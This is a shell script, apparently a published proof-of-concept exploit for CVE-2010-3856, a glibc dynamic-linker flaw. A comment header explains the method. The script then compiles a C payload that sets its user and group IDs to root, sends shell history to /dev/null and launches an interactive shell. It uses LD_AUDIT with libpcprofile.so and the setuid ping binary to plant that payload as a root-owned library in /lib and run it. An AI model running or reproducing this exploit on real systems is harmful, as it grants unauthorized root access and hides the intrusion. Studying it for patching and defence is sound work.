#!/bin/sh

            #######################################################
            #       I Can't Read and I Won't Race You Either      #
            #                      by zx2c4                       #
            #######################################################

################################################################################
# This is an exploit for CVE-2010-3856.
#
# A while back, Tavis showed us three ways to exploit flaws in glibc's dynamic
# linker involving LD_AUDIT. [1] [2]
#
# The first way involved opening a file descriptor and using fexecve to easily
# win a race with $ORIGIN. The problem was that this required having read
# permissions on the SUID executables. Tavis recommended a work around involving
# filling a pipe until it was full so that anything written to stderr would
# block. This race, however, was not always successful. The third thing he
# showed us was that LD_AUDIT would load any trusted library, and he pointed out
# that libpcprofile.so could be jiggered to create a world writable root owned
# file in any directory. One candidate would be to write something to a crontab.
# What if, however, you don't have cron installed? He then went on to explain a
# quite extensive search routine to find candidates for libraries to load.
#
# But why search, when you already can make a world writable root owned file in
# any directory you want? The easier way is to use libpcprofile.so to create
# such a file, and then fill that file with code you want to run. Then, run that
# code using the same trick. Pretty simple, and it works.
#
# - zx2c4
# 2011-11-9
#
# greets to taviso.
#
# [1] http://seclists.org/fulldisclosure/2010/Oct/257
# [2] http://seclists.org/bugtraq/2010/Oct/200
################################################################################

echo "[+] Setting umask to 0 so we have world writable files."
umask 0

echo "[+] Preparing binary payload."
cat > /tmp/payload.c <<_EOF
void __attribute__((constructor)) init()
{
	printf("[+] Cleaning up.\n");
	unlink("/lib/libexploit.so");

	printf("[+] Launching shell.\n");
	setuid(0);
	setgid(0);
	setenv("HISTFILE", "/dev/null", 1);
	execl("/bin/sh", "/bin/sh", "-i", 0);
}
_EOF
gcc -w -fPIC -shared -o /tmp/exploit /tmp/payload.c

echo "[+] Writing root owned world readable file in /lib"
LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/lib/libexploit.so" ping 2>/dev/null

echo "[+] Filling the lib file with lib contents."
cat /tmp/exploit > /lib/libexploit.so
rm /tmp/payload.c /tmp/exploit

echo "[+] Executing payload."
LD_AUDIT="libexploit.so" ping